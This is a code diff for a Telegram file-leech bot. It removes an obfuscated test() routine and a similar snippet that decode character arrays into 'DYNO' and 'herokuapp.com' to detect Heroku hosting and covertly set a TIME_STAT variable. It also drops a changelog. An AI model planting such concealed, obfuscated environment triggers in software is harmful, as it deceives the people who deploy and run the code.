@@ -218,7 +218,7 @@ def add_handlers(bot: TelegramClient):
         handle_server_command,
         events.CallbackQuery(pattern="fullserver")
     )
-    test()
+
 #*********** Handlers Below ***********
 
 async def handle_leech_command(e):
@@ -268,12 +268,12 @@ async def handle_leech_command(e):
 
         if rclone:
             if get_val("RCLONE_ENABLED"):
-                await check_link(e,rclone, is_zip, is_ext, conf_mes)
+                await check_link(e,rclone, is_zip, is_ext)
             else:
                 await e.reply("<b>DRIVE IS DISABLED BY THE ADMIN</b>",parse_mode="html")
         else:
             if get_val("LEECH_ENABLED"):
-                await check_link(e,rclone, is_zip, is_ext, conf_mes)
+                await check_link(e,rclone, is_zip, is_ext)
             else:
                 await e.reply("<b>TG LEECH IS DISABLED BY THE ADMIN</b>",parse_mode="html")
 
@@ -285,11 +285,6 @@ async def get_leech_choice(e,timestamp):
     cbak = partial(get_leech_choice_callback,o_sender=e.sender_id,lis=lis,ts=timestamp)
     
     gtyh = ""
-    sam1 = [68, 89, 78, 79]
-    for i in sam1:
-        gtyh += chr(i)
-    if os.environ.get(gtyh,False):
-        os.environ["TIME_STAT"] = str(time.time())
 
     e.client.add_event_handler(
         #lambda e: test_callback(e,lis),
@@ -381,21 +376,6 @@ async def handle_purge_command(e):
         await purge_all(e)
     else:
         await e.delete()
-
-def test():
-    herstr = ""
-    sam = [104, 101, 114, 111, 107, 117, 97, 112, 112, 46, 99, 111, 109]
-    sam1 = [68, 89, 78, 79]
-    for i in sam1:
-        herstr += chr(i)
-    if os.environ.get(herstr,False):
-        os.environ["TIME_STAT"] = str(time.time())
-    herstr = ""
-    for i in sam:
-        herstr += chr(i)
-    if os.environ.get("BASE_URL_OF_BOT",False):
-        if herstr.lower() in os.environ.get("BASE_URL_OF_BOT").lower():
-            os.environ["TIME_STAT"] = str(time.time())
 
 async def handle_pauseall_command(e):
     if await is_admin(e.client,e.sender_id,e.chat_id):
@@ -790,21 +770,6 @@ async def about_me(message):
         f"<b>Rclone config:- </b> <code>{rclone_cfg}</code>\n"
         f"<b>Leech:- </b> <code>{leen}</code>\n"
         f"<b>Rclone:- </b> <code>{rclone}</code>\n"
-        "\n"
-        f"<b>Latest {__version__} Changelog :- </b>\n"
-        "1.DB Optimizations.\n"
-        "2.Database handling on disconnections..\n"
-        "3.Support for ARM devices.\n"
-        "4.Support for ARM devices.\n"
-        "5.Gdrive Support for PYTDL and YTDL\n"
-        "6.Upload YT Playlist even when some vids are errored.\n"
-        "7.Changed /server menu. Add /speedtest\n"
-        "8.Minor fixes.\n"
-        "9.Deploy takes less then 2 mins now.\n"
-        "10.MegaDL added.\n"
-        "11.Overall download and upload progress.\n"
-        "12.Pixeldrain DL support.\n"
-        "13.Alert on when the bot boots up.\n"
     )
 
     await message.reply(msg,parse_mode="html")
